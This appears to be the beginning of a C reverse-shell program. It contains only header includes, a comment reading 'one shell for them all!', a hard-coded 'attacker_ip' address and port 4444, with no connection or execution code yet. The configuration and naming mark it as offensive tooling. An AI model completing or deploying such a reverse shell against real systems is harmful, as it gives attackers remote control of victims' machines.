#include <stdio.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h> 
#include <sys/types.h>  //im game: one shell for them all!
#include <sys/wait.h>

const char* attacker_ip = "100.66.181.0";
int port = 4444;

